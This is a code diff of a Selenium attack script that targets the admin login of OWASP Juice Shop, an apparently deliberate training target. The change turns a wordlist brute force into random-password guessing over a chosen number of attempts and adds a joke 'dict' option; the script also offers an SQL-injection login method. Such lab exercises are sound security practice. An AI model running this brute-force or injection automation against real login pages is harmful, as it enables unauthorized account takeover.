@@ -5,14 +5,17 @@ from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.keys import Keys
 import argparse
 import time
+import random, string
 
+letters = string.ascii_letters + "0123456789"
 
-
-
+def randomword():
+    length = random.randint(2, 16)
+    return ''.join(random.choice(letters) for i in range(length))
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument('-method', required=True) # valid types: sql, brute
+    parser.add_argument('-method', required=True) # valid types: sql, brute, dict
     parser.add_argument('-attempts', nargs='?', const=10000) # make depth attempts, only for admin_brute
     args = parser.parse_args()
     method = str(args.method)
@@ -37,7 +40,9 @@ def main():
     if(method == "sql"):
         logInAdminSql(driver)
     elif(method == "brute"):
-        bruteForcePassword(driver)
+        bruteForcePassword(driver, attempts)
+    elif(method == "dict"):
+        print("dictionary attack is not available in your geographic region")
     else:
         print("Usage: adminLogin.py -method=[sql, brute]")
     # Close the browser
@@ -45,8 +50,9 @@ def main():
     driver.quit()
     exit()
 
-def bruteForcePassword(driver):
+def bruteForcePassword(driver, attempts):
         # Attempt to log in
+    print("Strap in, this could take quite a while")
     try:
 
         acctBtn = WebDriverWait(driver, 10).until(
@@ -66,26 +72,26 @@ def bruteForcePassword(driver):
     )
     emailField.send_keys("admin@juice-sh.op")
     # Open file and test each password
-    with open("genericPasswords.txt") as f:
-        for password in f:
-            try:
-                print(f"Trying password: {password}")
-                passwordField = WebDriverWait(driver, 10).until(
-                    EC.presence_of_element_located((By.ID, "password"))
-                )
-                passwordField.clear()
-                passwordField.send_keys(password)
-                passwordField.send_keys(Keys.RETURN)
-            except Exception as e:
-                print(f"Could not enter text: {e}")
-
-            # Check if the login was successful
-            try:
-                invalidDiv = WebDriverWait(driver, 10).until(
-                    EC.presence_of_element_located((By.CLASS_NAME, "error.ng-star-inserted"))
-                )
-            except Exception as e:
-                print(f"Could not find invalid text: {e}")
+    #with open("genericPasswords.txt") as f:
+    for n in range(1, attempts):
+        password = randomword()
+        try:
+            print(f"Trying password: {password}")
+            passwordField = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.ID, "password"))
+            )
+            passwordField.clear()
+            passwordField.send_keys(password)
+            passwordField.send_keys(Keys.RETURN)
+        except Exception as e:
+            print(f"Could not enter text: {e}")
+         # Check if the login was successful
+        try:
+            invalidDiv = WebDriverWait(driver, 10).until(
+                EC.presence_of_element_located((By.CLASS_NAME, "error.ng-star-inserted"))
+            )
+        except Exception as e:
+            print(f"Could not find invalid text: {e}")
 
 
 def logInAdminSql(driver):
